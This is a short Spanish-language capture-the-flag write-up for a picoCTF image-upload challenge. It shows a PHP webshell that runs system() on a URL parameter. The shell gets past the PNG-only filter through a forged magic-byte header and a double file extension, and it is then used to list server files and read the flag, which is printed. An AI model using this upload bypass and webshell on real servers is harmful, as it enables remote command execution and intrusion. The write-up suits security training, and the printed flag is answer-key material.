I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:51516/)!

### Solucion

```
Tenemos una pagina para subir imagenes png unicamente,
asi que tratamos de hacer una webshell php para acceder a los comandos de esta manera:
──(kali㉿kali)-[~]
└─$ nano webshell.php                                                                                                                                                 
─$ cat webshell.png.php 
PNG <----
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

┌──(kali㉿kali)-[~/Documents]
└─$ xxd webshell.php.png 
00000000: 504e 470a 3c3f 7068 700a 6966 2869 7373  PNG.<?php.if(iss
00000010: 6574 2824 5f47 4554 5b27 636d 6427 5d29  et($_GET['cmd'])
00000020: 2920 7b0a 2020 2020 6563 686f 2022 3c70  ) {.    echo "<p
00000030: 7265 3e22 0a20 2020 2073 7973 7465 6d28  re>".    system(
00000040: 245f 4745 545b 2763 6d64 275d 293b 0a20  $_GET['cmd']);. 
00000050: 2020 2065 6368 6f20 223c 2f70 7265 3e22     echo "</pre>"
00000060: 0a7d 0a3f 3e0a 0a                        .}.?>..
                                

Con el PNG al principio logramos que los numeros coincidan y nos deje subir el archivo engañando asi la pagina y la webshell nos da un cmd con el cual podemos navegar para atras en las carpetas de la pagina, con urls asi como un orden correcto de las extenciones para que funcionen las urls(Primero png luego php):
http://atlas.picoctf.net:51516/uploads/webshell.png.php?cmd=ls%20..
existe un archivo extraño:
PNG

HFQWKODGMIYTO.txt <---
index.php
instructions.txt
robots.txt
uploads

lo habrimos con cat y allí esta la flag


                                                                                                                           
┌──(kali㉿kali)-[~/Documents]

PNG

/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */
```